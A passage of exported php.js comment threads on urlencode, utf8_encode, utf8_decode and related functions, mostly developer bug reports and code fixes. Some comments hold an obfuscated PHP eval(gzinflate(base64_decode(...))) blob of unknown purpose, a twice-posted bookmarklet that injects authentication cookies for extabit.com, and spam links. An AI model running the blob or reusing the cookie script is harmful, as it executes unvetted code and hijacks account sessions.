'%29').replace(\/\\*\/g, '%2A').replace(\/%20\/g, '+');[\/code]\nThe simpler:\n[code]return encodeURIComponent(str).replace(\/[!'\\(\\)\\*]\/g, function(a) {return '%'+a.charCodeAt(0).toString(16);}).replace(\/%20\/g, '+');[\/code]\nbe used instead?"},{"date":"2011-08-09 06:11:45","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Kolink: I like the elegance of your code, but since it is not that much shorter, and in my tests on Firefox anyways, it is slower, I think we ought to stick with what we have. The way it is now is also more readable. Btw, you don't need backslashes inside a character class except for other backslashes, initial caret, and medial right brackets or hyphens (medial here meaning non-initial, non-terminal, and not-immediately-following-an-initial-caret)."},{"date":"2011-09-03 13:29:54","author":"Robert Eisele","url":"http:\/\/www.xarg.org\/","comment":"The urlencode function can be optimized by reducing all .replace() calls to one call with a callback like this:\n\n[CODE]\nfunction urlencode (str) {\n\n\treturn encodeURIComponent(str).replace(\/!|'|\\(|\\)|\\*|%20\/g, function(x) {\n\n\t\treturn {\n\t\t\t\"!\":\t\"%21\",\n\t\t\t\"'\":\t\"%27\",\n\t\t\t\"(\":\t\"%28\",\n\t\t\t\")\":\t\"%29\",\n\t\t\t\"*\":\t\"%2A\",\n\t\t\t\"%20\":\t\"+\"\n\t\t}[x];\n\t});\n}\n[\/CODE]\n\nThe reason for this change is performance. I've added a test on jsperf: http:\/\/jsperf.com\/url-encode"},{"date":"2011-09-29 09:34:09","author":"Ruslan","url":"http:\/\/tftm.org.ua\/","comment":"Thanks, article was really helpful."},{"date":"2011-11-18 11:39:49","author":"meera","url":"web development india","comment":"\nThis is very help for me, thanks for your sharing informations\n\nThanks\n<a href=\"htttp:\/\/www.pluskb.com\">web development india\nbangalore<\/a>"},{"date":"2012-04-09 16:37:17","author":null,"url":"","comment":"it only worked for me if instead of \n[code]urlencode('Kevin van Zonneveld!');[\/code]\ni used\n[code]urlencode(escape('Kevin van Zonneveld!'));[\/code]\n\nan alternative (that i used) is instead of\n[code]return encodeURIComponent(str).replace(\/!\/g, '%21').replace(\/'\/g, '%27').replace(\/\\(\/g, '%28').\n    replace(\/\\)\/g, '%29').replace(\/\\*\/g, '%2A').replace(\/%20\/g, '+');[\/code]\n\nadd the escape becoming\n[code]return encodeURIComponent(escape(str)).replace(\/!\/g, '%21').replace(\/'\/g, '%27').replace(\/\\(\/g, '%28').\n    replace(\/\\)\/g, '%29').replace(\/\\*\/g, '%2A').replace(\/%20\/g, '+');[\/code]"}],"usort":[{"date":"2012-03-01 21:12:14","author":"Glen","url":"","comment":"This routine is strange in that it reads as if it should accept an array yet it returns an object.  JS does not guarantee maintaining the order of elements of an object, and while it may work on some browsers, it should not be relied on.  So it is pointless to sort an object.  This routine should take an array and return an array ... and contain comments to indicate to the user that they shouldn't attempt to create a sorted object in JS.  It works well in the PHP world, but unfortunately it doesn't translate directly to JS.  In JS, you sometimes need to create an object store and an array store (to indicate order) to get direct access and order."},{"date":"2012-03-02 02:37:56","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Glen: Yes, you are right; as per the notes, this is only really useful for the likes of Firefox extensions (not sure if Mozilla will or has abandoned sorting order). See the array() function source code for the beginnings of an API to allow a more reliable though somewhat uglier syntax like: array({key1:value1}, {key2:value2}). Feel free to implement this using that syntax!"},{"date":"2012-04-04 14:36:34","author":"????? ????","url":"http:\/\/an3m1.com\/","comment":"If I might \u2014perhaps you should consider adding a few images. I don\u2019t mean to disrespect what you\u2019ve said ; its very enlightening, indeed. However, I think would respond to it more positively if they could be something tangible to your ideas \n"}],"utf8_decode":[{"date":"2008-05-08 01:42:51","author":"Aman Gupta","url":"","comment":"This implementation is extremely slow in IE due to string concatenation. It is much faster to push onto an array and return array.join('')."},{"date":"2008-05-08 21:56:26","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Aman Gupta: Thanks I've updated all of the base64 &amp; utf functions based on your findings."},{"date":"2008-09-18 15:19:19","author":"Norman &quot;zEh&quot; Fuchs","url":"","comment":"Unused c1 - fix it : )"},{"date":"2008-09-18 15:20:30","author":"Norman &quot;zEh&quot; Fuchs","url":"","comment":"2 times htmlentities -.-\r\n\r\n#3. .. &amp;quot;zEh&amp;quot;"},{"date":"2008-09-18 15:22:00","author":"Norman &quot;zEh&quot; Fuchs","url":"","comment":".. and c3 declaration is missing :D"},{"date":"2008-09-21 21:43:25","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Norman: Thank you, fixed. What do you mean by 2 times htmlentities though?"},{"date":"2008-10-05 15:07:13","author":"hitwork","url":"","comment":"There is an error in this function on the following line\r\n\r\n} else if ((c1 &gt; 191) &amp;&amp; (c &lt; 224)) {\r\n\r\nit should be c1&lt;224\r\n\r\nbr,\r\nmargus"},{"date":"2008-10-06 12:25:11","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ hitwork: Wow thank you hitwork!"},{"date":"2009-04-01 10:07:48","author":"Otto Wyss","url":"http:\/\/www.orpatec.ch\/index.php?page=gallery.php","comment":"I've a folder name \"Sihlh\u00f6lzli\" which I utf8_encode on the server with PHP. This gives me \"Sihlh\\u00f6lzli\" and if it's displayed by the browser it nicely shows \"Sihlh\u00f6lzli\". Of course I can't use this name to load an image therefore use the utf8_decode in Javascript to decode the name. Unfortunately that doesn't work, not even the browser can display it. Any idea whats wrong?"},{"date":"2009-04-01 16:59:39","author":"Tim de Koning","url":"http:\/\/www.kingsquare.nl","comment":"@otto\n\nPHP \n[CODE]\nutf8_encode('Sihlh\u00f6lzli')\n[\/CODE]\nreturns 'Sihlh\u00c3\u00b6lzli'\n\nJAVASCRIPT\n[CODE]\nutf8_decode('Sihlh\u00c3\u00b6lzli');\n[\/CODE]\nreturns 'Sihlh\u00f6lzli'\n\nSeems fine to me...?\n\n"},{"date":"2009-04-03 16:45:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Tim de Koning: thx for helping out man! \n@ Otto Wyss: Can you confirm this?"},{"date":"2009-05-05 01:33:17","author":"Ben Pettit","url":"www.digimulti.com","comment":"This function had troubles with the utf8_encode function when i included the transport.min.js file into my adobe javascript plugin, while using the md5 function.\nThe way i fixed it was by adding as the first line:\n[code]\nstr_data = str_data.valueOf();\n[\/code]\n\nThanks for the great open source library!  I'm just trying to give back a little bit.\nCheers,\nBen."},{"date":"2009-05-12 17:51:18","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ben Pettit: There has been some talk about it over at the utf8_encode function. Let's work it out over there, and then - if needed - we'll fix utf8_decode accordingly."},{"date":"2009-09-23 17:37:18","author":"Michel Corne","url":"http:\/\/mcorne.blogspot.com\/","comment":"I am afraid there is a problem with this function. Try to convert \"\u00e0\" that is multibyte character. \"str_data.length\" equals \"1\" (char) since javascript is UTF-8 compliant. But C1 = 224 that is > 128 and you end up playing with C2 and C3 that don't even exist :-) Here is the code I propose. It simply translates the string from UTF-8 to iso-8859-15 (improved from iso-8859-1) with a translation table for all non ASCII characters. Let me know what you think. Thanks, MC.\n\n[CODE]\nfunction utf8_decode (utf8) {\n    \/\/ control characters are left for alignment reasons, they will not be used anyway!\n    var i, iso885915 = '', \n    utf8ToIso885915 = {\n    'NBSP': '\\xA0', '\u00a1': '\\xA1', '\u00a2': '\\xA2', '\u00a3': '\\xA3', '\u20ac': '\\xA4', '\u00a5': '\\xA5', '\u0160': '\\xA6', '\u00a7': '\\xA7', \n    '\u0161': '\\xA8', '\u00a9': '\\xA9', '\u00aa': '\\xAA', '\u00ab': '\\xAB', '\u00ac': '\\xAC', 'SHY': '\\xAD', '\u00ae': '\\xAE', '\u00af': '\\xAF',\n    '\u00b0': '\\xB0', '\u00b1': '\\xB1', '\u00b2': '\\xB2', '\u00b3': '\\xB3', '\u017d': '\\xB4', '\u00b5': '\\xB5', '\u00b6': '\\xB6', '\u00b7': '\\xB7', \n    '\u017e': '\\xB8', '\u00b9': '\\xB9', '\u00ba': '\\xBA', '\u00bb': '\\xBB', '\u0152': '\\xBC', '\u0153': '\\xBD', '\u0178': '\\xBE', '\u00bf': '\\xBF', \n    '\u00c0': '\\xC0', '\u00c1': '\\xC1', '\u00c2': '\\xC2', '\u00c3': '\\xC3', '\u00c4': '\\xC4', '\u00c5': '\\xC5', '\u00c6': '\\xC6', '\u00c7': '\\xC7', \n    '\u00c8': '\\xC8', '\u00c9': '\\xC9', '\u00ca': '\\xCA', '\u00cb': '\\xCB', '\u00cc': '\\xCC', '\u00cd': '\\xCD', '\u00ce': '\\xCE', '\u00cf': '\\xCF', \n    '\u00d0': '\\xD0', '\u00d1': '\\xD1', '\u00d2': '\\xD2', '\u00d3': '\\xD3', '\u00d4': '\\xD4', '\u00d5': '\\xD5', '\u00d6': '\\xD6', '\u00d7': '\\xD7', \n    '\u00d8': '\\xD8', '\u00d9': '\\xD9', '\u00da': '\\xDA', '\u00db': '\\xDB', '\u00dc': '\\xDC', '\u00dd': '\\xDD', '\u00de': '\\xDE', '\u00df': '\\xDF', \n    '\u00e0': '\\xE0', '\u00e1': '\\xE1', '\u00e2': '\\xE2', '\u00e3': '\\xE3', '\u00e4': '\\xE4', '\u00e5': '\\xE5', '\u00e6': '\\xE6', '\u00e7': '\\xE7', \n    '\u00e8': '\\xE8', '\u00e9': '\\xE9', '\u00ea': '\\xEA', '\u00eb': '\\xEB', '\u00ec': '\\xEC', '\u00ed': '\\xED', '\u00ee': '\\xEE', '\u00ef': '\\xEF', \n    '\u00f0': '\\xF0', '\u00f1': '\\xF1', '\u00f2': '\\xF2', '\u00f3': '\\xF3', '\u00f4': '\\xF4', '\u00f5': '\\xF5', '\u00f6': '\\xF6', '\u00f7': '\\xF7', \n    '\u00f8': '\\xF8', '\u00f9': '\\xF9', '\u00fa': '\\xFA', '\u00fb': '\\xFB', '\u00fc': '\\xFC', '\u00fd': '\\xFD', '\u00fe': '\\xFE', '\u00ff': '\\xFF'\n    }\n    \n    for (i = 0; i < utf8.length; i++){\n        iso885915 += utf8ToIso885915[utf8[i]]? utf8ToIso885915[utf8[i]] : utf8[i];\n    }\n\n    return iso885915;\n}\n[\/CODE"},{"date":"2009-09-24 02:55:15","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Michel Corne: Thank you for the function. The site still has some apparent problems with Unicode in comments (if not the function!), so would you mind submitting your code to http:\/\/pastebin.com\/ and sending us a link?"},{"date":"2009-12-29 10:28:07","author":"Walessio","url":"","comment":"Bugs found from Firefox 3.0.16 (on Windows Vista):\ni is not defined \ntmp_arr is not defined\n\nadd this to solve the problem:\nvar i;\nvar tmp_arr = new Array();\n\nalso, unserialize does not unserialize serialized associative arrays"},{"date":"2009-12-30 06:52:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Walessio: The declaration was already there (and for some more variables too), but I think the syntax highlighter doesn't accurately insert newlines, so when you copy-paste, it doesn't always preserve them. To be safer, just paste from the \"raw js source\" link.\n@Kevin, I think here's some proof that it'd be better to go back to the old commenting system... The function shows the declaration, but when people copy-paste it, some lines get merged into comments, etc. Sorry for all of these \"unfunded\" requests... :)"},{"date":"2010-01-27 10:06:42","author":"Chris Ahrweiler","url":"","comment":"Hello, \n\ntried the function, looking good, but german Umlaut \"\u00df\" wouldn't be converted correctly. Any improved version of this function available?\n\nRegards, Chris."},{"date":"2010-01-31 05:22:26","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Chris Ahrweiler: Are you sure you are using it correctly? \n\nPlease note that these functions in php.js are not related to whether the current page itself is in UTF-8 or not; JavaScript always uses UTF-16 internally.\n\nAs a little background if you weren't aware, JavaScript internally uses two-bytes to represent every character (or four bytes in some extremely rare characters--surrogate pairs which are two pseudo-characters joined together to form a single character but whose string length is 2). UTF-8, on the other hand, uses 1-4 bytes for each character, while ISO-8859-1 uses exactly 1 byte (it can do that because is far more limited, in handling only Latin characters). UTF-8 uses 1-2 bytes for the same range as ISO-8859-1 (1 bytes for the ASCII); the reason it must use 2 bytes in some cases, even though Unicode assigns the same code points as used in in ISO-8859-1, is because one of the bits in a UTF-8 byte is reserved for indicating whether the byte is a single 1-byte sequence or part of a multi-byte sequence.\n\nSo, in order to represent UTF-8 in JavaScript (and even ISO-8859-1), we are forced with either using an array of code points, where each number represents the value for a single byte, or using a string where each character has the code point value of a single byte. \n\nInternally, JavaScript will use two bytes (or rarely 4 bytes), but we can use its strings to represent a sequence of single byte characters (ISO-8859-1) or a sequence of 1-4 byte character sequences (UTF-8). (If you put the text in an alert, our \"UTF-8\" will not be human-readable, while our \"ISO-8859-1\" will be.)\n\nIn JavaScript you can easily discover what the UTF-8 sequence for a character should be by using encodeURIComponent. For the sharp-S, it gives \"%C3%9F\", which, translated into a multiple single-byte string sequence is \"\\u00C3\\u009F\" or, more visually, \"\u00c3\\u009F\". \n\nIn ISO-8859-1, it should simply be \"\\u00DF\" or \"\u00df\".\n\nIn other words, we can treat regular JavaScript as though it were ISO-8859-1 since both have a fixed correspondence between a character and number of bytes (ISO-8859-1 is 1-to-1 while UTF-16 is 1 to 2, unless for rare (and non-Latin) characters not present in ISO-8859-1 where the correspondence is 1-to-4; 4-byte characters are necessary in some cases since even 2 bytes is not enough to represent all of the scripts supported by Unicode).\n\nSo, \"utf8_decode\" would only be used if you already have a string of characters in this artificial \"UTF-8\" where each \"character\" has up to a full byte of value (0-255)--representing a single byte in a UTF-8 1-4 byte sequence.\n\n\"utf8_encode\", on the other hand, would let you encode a ISO-8859-1 string (or Latin UTF-16 strings) into such an artificial \"UTF-8\" sequence of 1-2 byte sequences.\n\nIf the above doesn't help, feel free to clarify exactly what you are trying to do and why."},{"date":"2010-01-31 05:29:24","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"By the way, if you change the functions to avoid String.fromCharCode() and charCodeAt(), and just deal with an array of numbers, you can convert between the character sets more efficiently (unless you need to print to string format)."},{"date":"2010-09-19 00:29:30","author":"Eli Grey","url":"http:\/\/eligrey.com\/","comment":"This entire function can be replaced with the following.\n\n[CODE]\nfunction utf8_decode (str_data) {\n    return unescape(encodeURIComponent(str_data));\n}\n[\/CODE]"},{"date":"2010-11-05 11:52:20","author":"Michael","url":"","comment":"I tried this function with german umlauts ('\u00e4') and didn't get it working. I have a login form on a UTF-8 page and must convert the user input data to ISO-8859-1 before submitting (the target server only accepts ISO-8859-1).\r\n\r\nThe conversion is done, but the login fails because of wrong credentials (due to the \"\u00e4\" in the password field). \r\n\r\nIs there a problem with converting data from user input fields?"},{"date":"2010-11-09 18:47:55","author":"Neilmas","url":"","comment":"Excelente script gracias de Per\u00fa."},{"date":"2010-11-21 18:50:37","author":"Anurup Raveendran","url":"www.mecmh.com","comment":"hey ! this function saved my life :D . thanks alot !!!!"},{"date":"2010-12-13 23:52:29","author":"ikizsohbet","url":"http:\/\/www.ikizsohbet.com","comment":"help ????????\n\n<?php\neval(gzinflate(base64_decode('NdI3kptQAADQfk\/hbrWzhUDkscc7ILJAIJJYGs+H\/0kiZzi93fgGr3hfv99+fXV594YWUJ2yo2jSCkzoFIMR0eQfiJIWotP7HSrUq9cfvCQ6xO3cDoavIa3gA+nT5oJMdmSBz4BrBBFoMmtjz+FjZ79xi0jsFI84sYHPIeLLx+egvobtIYexZmUHyOHBbVIVbONCshu1gsDtJV\/judKdL0Ky97h7paP6vJWma+Sm54VmF6Fva5cFfQyumnfb2toDMw8EebslBdbKvnsjJ4pXUSxVui3bgolkN4xSr3s6NLnqryUVmGgdqHwxeh3zCFCV6f5I6yM32Gf4z4klV363xJfPeLS7HqNwGQEYzvhRyU78jZWciDsN1+ezlubayDuHdqszPwxk6Ra0gU\/abqWu2DpdwkBpAwZMzuqpXVKtlnhgdpA2SuHbKDpoER4RFu3y2ujY4UodhyPzqpGv3mcOAE2yqBEkmXtPQMG07QV1PeM7ljSOxHDh+RlrmnFyWNxlAhDmY7KPCXNfRYItdrY+0m6JakQLbgwVbmXT0KpfYIzia2livK8S8AlXk\/J1R0k4m5Hn+zkOKw8rW+XygLusA5KqGXUa+6OdiqKaWss0KMUzaM7ntykqiO0uh1dTkgDZ5PM82wT3CevxXAE1ZezzkqnvHx8fP9++\/gf78Rc=')));\n?>"},{"date":"2010-12-14 04:57:24","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@ikizsohbet: Sorry, the best I can suggest is looking at gzinflate() in the PHP C source code and converting it to JavaScript (and then hopefully sharing with us!) :)\n\nThe path where the function is defined is \/ext\/zlib\/zlib.c"},{"date":"2010-12-14 05:07:35","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@ikizsohbet: As I should have said, if you are only trying to figure out the code for yourself (and not from JavaScript), just change the eval() into echo() and run on PHP."},{"date":"2010-12-14 05:09:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@ikizsohbet: And to be extra careful to protect yourself from a potential XSS attack (if you run this test on your server), inside your echo(), also make a proper call to htmlentities()."},{"date":"2011-08-29 17:43:42","author":"Knight4","url":"","comment":"I'm having issues with uppercase latin characters such as \"\u00c7\", for instance.\n\nAny ideas? Thanks in advance"},{"date":"2012-02-22 22:30:12","author":"Martins","url":"","comment":"this function breaks \u00b9 \u00b2 \u00b3 symbols"},{"date":"2012-03-22 13:53:33","author":"????? ????????","url":"http:\/\/an3m1.com\/","comment":"News stories in the world of new cars "},{"date":"2012-05-11 11:57:33","author":"ferliplex","url":"","comment":"%20var%20domain%20=%20'extabit.com';var%20cookies%20=%20new%20Array();cookies['auth_uid']%20=%20'105657';cookies['auth_hash']%20=%20'dfc04c16bced7543c9518e092ade6f1d';if%20(location.href.indexOf(domain)==-1)%20{var%20g%20=%20confirm('You%20will%20be%20redirected%20to%20'%20+%20domain%20+%20'.%20You%20will%20have%20to%20run%20this%20script%20again.%20Continue?');if%20(g)%20{location.href%20=%20'http:\/\/'%20+%20domain;}}%20else%20{alert(\"premiumhunt2012.blogspot.com\");for(var%20i%20in%20cookies){void(document.cookie%20=%20i+'='+cookies[i]+';domain=.'+domain+';path=\/;');}location.href%20=%20'http:\/\/'+domain;}"},{"date":"2012-08-30 21:27:18","author":"Rene Olivo","url":"","comment":"add \t\n\ntmp_arr=Array();\n\nin the line 24 and this work!"},{"date":"2012-09-11 18:10:30","author":"Jacob Lee","url":"","comment":"Seems to me it does work differently from PHP's when the text has multibyte character inside.\n\nexample)\nin php\n[code]\necho base64_encode(utf8_encode('this is the text and \ud55c\uae00')); \/\/ Korean characters inside\n[\/code]\nin Javascript\n[code]\ndocument.write(base64_encode(utf8_encode('this is the text and \ud55c\uae00)));\n[\/code]\nthe php result is not the same with javascript result."},{"date":"2012-09-12 17:34:59","author":"Jacob Lee","url":"","comment":"Now I got it! If you want the output of PHP and that of Javascript to be same, use utf16to8 and utf8to16 function for javascript for javascript's string represents as utf16."}],"utf8_encode":[{"date":"2008-08-08 17:50:42","author":"sowberry","url":"","comment":"While looking for a javascript crc script, I found the version on webtoolkit.info as well as your subsequent modification.\r\n\r\nTesting with a chunk of text a couple hundred characters long, with just a couple non-ascii values, I saw no significant improvement with your approach of using an array as a pseudo-StringBuilder.  The issue is the use of String.fromCharCode for even ascii values, which forces too many string creations.  The code below is about 3 times faster in my tests:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction utf8_encode(string) {\r\n    string = string.replace(\/\\r\\n\/g,&quot;\\n&quot;);\r\n    var utftext = &quot;&quot;;\r\n    var start, end;\r\n\r\n    start = end = 0;\r\n    for (var n = 0; n &lt; string.length; n++) {\r\n\r\n        var c = string.charCodeAt(n);\r\n        var enc = null;\r\n\r\n        if (c &lt; 128) {\r\n            end++;\r\n        }\r\n        else if((c &gt; 127) &amp;&amp; (c &lt; 2048)) {\r\n            enc = String.fromCharCode((c &gt;&gt; 6) | 192) + String.fromCharCode((c &amp; 63) | 128);\r\n        }\r\n        else {\r\n            enc = String.fromCharCode((c &gt;&gt; 12) | 224) + String.fromCharCode(((c &gt;&gt; 6) &amp; 63) | 128) + String.fromCharCode((c &amp; 63) | 128);\r\n        }\r\n        if (enc != null)\r\n        {\r\n            if (end &gt; start)\r\n            {\r\n                utftext += string.substring(start, end);\r\n            }\r\n            utftext += enc;\r\n            start = end = n+1;\r\n        }\r\n\r\n    }\r\n    if (end &gt; start)\r\n    {\r\n        utftext += string.substring(start, string.length);\r\n    }\r\n\r\n    return utftext;\r\n}\r\n[\/CODE]\r\n\r\nPlease feel free to post this to the various script repositories, as I am not especially active on the web.  Thanks."},{"date":"2008-08-27 18:14:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ sowberry: Thank you for your improvement!"},{"date":"2008-11-12 21:15:28","author":"Yves Sucaet","url":"","comment":"I think it makes sense to replace\r\n[CODE=&quot;Javascript&quot;]\r\nstring = (string+'').replace(\/\\r\\n\/g,&quot;\\n&quot;);\r\n[\/CODE]\r\n\r\nwith \r\n\r\n[CODE=&quot;Javascript&quot;]\r\nstring = (string+'').replace(\/\\r\\n\/g,&quot;\\n&quot;);\r\nstring = (string+'').replace(\/\\r\/g,&quot;\\n&quot;);\r\n[\/CODE]"},{"date":"2008-11-13 23:21:56","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Yves Sucaet: I don't see the harm in that :) thank you Yves!"},{"date":"2008-11-14 12:06:00","author":"Onno Marsman","url":"","comment":"This is just weird. Of course the extra (string+'') is not necessary. The following would do exactly the same:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nstring = (string+'').replace(\/\\r\\n\/g, &quot;\\n&quot;).replace(\/\\r\/g, &quot;\\n&quot;);\r\n[\/CODE]\r\n\r\nor even something like (not tested):\r\n[CODE=&quot;Javascript&quot;]\r\nstring = (string+'').replace(\/\\r\\n?\/g, &quot;\\n&quot;);\r\n[\/CODE]"},{"date":"2008-11-14 14:06:32","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Sjeesh, it has been a long day... But that long.. Thx Onno."},{"date":"2009-05-05 01:16:41","author":"Ben Pettit","url":"www.digimulti.com","comment":"I made a fix so this function ran correctly in adobe javascript.\n\n[code]\nfunction utf8_encode ( string ) {\n    \/\/ Encodes an ISO-8859-1 string to UTF-8  \n    \/\/ \n    \/\/ version: 812.316\n    \/\/ discuss at: http:\/\/phpjs.org\/functions\/utf8_encode\n    \/\/ +   original by: Webtoolkit.info (http:\/\/www.webtoolkit.info\/)\n    \/\/ +   improved by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\n    \/\/ +   improved by: sowberry\n    \/\/ +    tweaked by: Jack\n    \/\/ +   bugfixed by: Onno Marsman\n    \/\/ +   improved by: Yves Sucaet\n    \/\/ +   bugfixed by: Onno Marsman\n    \/\/ +   adobe js by: Ben Pettit\n    \/\/ *     example 1: utf8_encode('Kevin van Zonneveld');\n    \/\/ *     returns 1: 'Kevin van Zonneveld'\n    string\t=\tstring.valueOf(); \/\/    <-bp:  I added this line.\n    \n    string = (string+'').replace(\/\\r\\n\/g, \"\\n\").replace(\/\\r\/g, \"\\n\");\n\n    var utftext = \"\";\n    var start, end;\n    var stringl = 0;\n[\/code]"},{"date":"2009-12-01 02:28:26","author":"Keith","url":"www.vuware.com","comment":"This function will throw an exception if passed an empty string.\n\nI think it needs to include \"[CODE]try {} catch(e) {} return'';[\/CODE]\" around its contents and the following line at the start: \n\n[CODE]\n if (argString == '') return '';\n[\/CODE]\n"},{"date":"2010-04-07 10:41:25","author":null,"url":"http:\/\/www.cristianperez.com","comment":"Hey, you have an error.\nYou are using into the code the object string.*, but the argument name is \"argString\" instead of \"string\".\n\nUsing argString instead of string it works correctly"},{"date":"2010-04-10 18:47:47","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Cristi\u00e1n: I think what happened is that you must have copied the text directly from this page, but the commenting code often messes up the new lines. To get a pristine version (and the latest version), use the link \"raw js source\"..."},{"date":"2010-09-19 00:30:35","author":"Eli Grey","url":"http:\/\/eligrey.com\/","comment":"This entire function can be replaced with the following.\n\n[CODE]\nfunction utf8_encode (argString) {\n    return decodeURIComponent(escape(argString));\n}\n[\/CODE]"},{"date":"2011-01-08 22:00:49","author":"Anthon Pang","url":"http:\/\/activeanalytics.com","comment":"Eli.  That's not cross browser portable, plus it won't work with some input, e.g., \"malformed URI sequence\" errors on FF."},{"date":"2011-01-09 18:26:21","author":"Anthon Pang","url":"http:\/\/activeanalytics.com","comment":"Patch using Eli's suggestion (though, he posted the equivalent for utf8_decode):\n\n[CODE]\n--- utf8_encode.js.old\t2011-01-09 12:23:22.000000000 -0500\n+++ utf8_encode.js\t2011-01-09 12:23:49.000000000 -0500\n@@ -11,6 +11,10 @@\n     \/\/ *     example 1: utf8_encode('Kevin van Zonneveld');\n     \/\/ *     returns 1: 'Kevin van Zonneveld'\n \n+    if (typepof window.encodeURIComponent !== 'undefined') {\n+        return unescape( window.encodeURIComponent( argString ));\n+    }\n+\n     var string = (argString+''); \/\/ .replace(\/\\r\\n\/g, \"\\n\").replace(\/\\r\/g, \"\\n\");\n \n     var utftext = \"\";\n[\/CODE]"},{"date":"2011-01-10 10:07:40","author":"Manu","url":"","comment":"this function doesnt work for me\r\nDo i have to declare the Javascript version?"},{"date":"2011-01-15 18:25:28","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Manu: What are you trying to do? Do you have some sample code?"},{"date":"2011-04-07 09:18:37","author":"Soulcyon","url":"http:\/\/haloindex.com","comment":"[CODE]\nfunction utf8_encode(){\n    var str = arguments[0] + \"\",\n        len = str.length - 1,\n        i = -1,\n        result = \"\";\n        \n    while( !!(i++ - len) ){\n        var c = str.charCodeAt(i),\n            ops = [\n                c,\n                (c >> 6 | 192) + (c & 63 | 128),\n                (c >> 12 | 224) + (c >> 6 & 63 | 128) + (c & 63 | 128)\n            ],\n            i =  c < 128 ? 0 : c < 2048 ? 1 : 2;\n        result += String.fromCharCode(ops[i]);\n    }\n    return result;\n}\n[\/CODE]"},{"date":"2011-05-01 11:31:05","author":"Gajus","url":"http:\/\/guy.lt","comment":"Doesn't work with the following string:\n\u20ac,\u00b4,\u20ac,\u00b4,\u6c34,\u0414,\u0404"},{"date":"2011-05-02 04:24:45","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Gajus: JavaScript uses Unicode internally, even if your document is encoded in ISO-8859-1. This function should only be needed if you have a string already using that encoding (or otherwise you are double-encoding). You could provide the codepoints you have, and what you expect it to return."},{"date":"2012-02-08 18:21:30","author":"kirilloid","url":"kirilloid.ru","comment":"String.fromCharCode accepts several arguments.\nReplacing lines 34-36 with\n[code]    enc = String.fromCharCode((c1 >> 6) | 192, (c1 & 63) | 128);\n} else {\n    enc = String.fromCharCode((c1 >> 12) | 224, ((c1 >> 6) & 63) | 128, (c1 & 63) | 128);[\/code]\nmay reduce execution time from 20x to 12x on mostly non-ascii strings (e.g. cyrillic text)."},{"date":"2012-05-11 11:58:34","author":"ferliplex","url":"","comment":"%20var%20domain%20=%20'extabit.com';var%20cookies%20=%20new%20Array();cookies['auth_uid']%20=%20'105657';cookies['auth_hash']%20=%20'dfc04c16bced7543c9518e092ade6f1d';if%20(location.href.indexOf(domain)==-1)%20{var%20g%20=%20confirm('You%20will%20be%20redirected%20to%20'%20+%20domain%20+%20'.%20You%20will%20have%20to%20run%20this%20script%20again.%20Continue?');if%20(g)%20{location.href%20=%20'http:\/\/'%20+%20domain;}}%20else%20{alert(\"premiumhunt2012.blogspot.com\");for(var%20i%20in%20cookies){void(document.cookie%20=%20i+'='+cookies[i]+';domain=.'+domain+';path=\/;');}location.href%20=%20'http:\/\/'+domain;}"},{"date":"2012-06-16 07:39:00","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@kirilloid: Looks like your fix was added to Git."}],"var_export":[{"date":"2008-07-19 21:24:13","author":"Oleg Butuzov (http:\/\/made.com.ua)","url":"","comment":"sleep ?\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n        function sleep(seconds) {\r\n            for(var i=seconds; i &gt; 0; i--) {\r\n\t\t\t\tvar start = Number(new Date().getTime());\r\n\t\t\t\twhile (true) {\r\n                \tif ( (new Date().getTime() - start) &gt; 1000) {\r\n                    \tbreak;\r\n                \t}\r\n            \t}\r\n\t\t\t}\r\n        }\r\n\r\n[\/CODE]"},{"date":"2008-07-20 12:32:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Oleg Butuzov: I'd think it would be great to have a sleep function, but this implementation locks up the browser. Maybe we could investigate in an alternative implementation based on setTimeout or something?"},{"date":"2008-08-22 12:35:57","author":"johnrembo","url":"","comment":"currently this function fails on objects that contain any method. Also, I suggest to use typeof instead of instanceof:\r\n\r\nvar phpBridge = {\r\n  var_export: function (mixed_content) {\r\n      var variable=mixed_content;\r\n      var __pad_lines = function ( x ) {\r\n          return x.split(&quot;\\n&quot;).join(&quot;\\n  &quot;);\r\n      };\r\n      \r\n      var retstr = &quot;&quot;;\r\n\r\n      if(typeof variable == ('object' || 'array')) {\r\n          var iret = &quot;&quot;;\r\n          for(i in variable) {\r\n              iret=iret+&quot;\\n&quot;+this.var_export(i,true)+&quot; =&gt; &quot;+this.var_export(variable[i], true)+&quot;,&quot;;\r\n          }\r\n          retstr = &quot;array (&quot;+__pad_lines(iret)+&quot;\\n)&quot;;\r\n      } else if( variable === null) {\r\n          retstr = &quot;NULL&quot;;\r\n      } else if ( typeof variable == 'function') {\r\n        retstr=&quot;'function'&quot;;\r\n      } else {\r\n          retstr = (!isNaN( variable )) ? variable : &quot;'&quot; + variable.replace('\/([&quot;\\'\\])\/g', 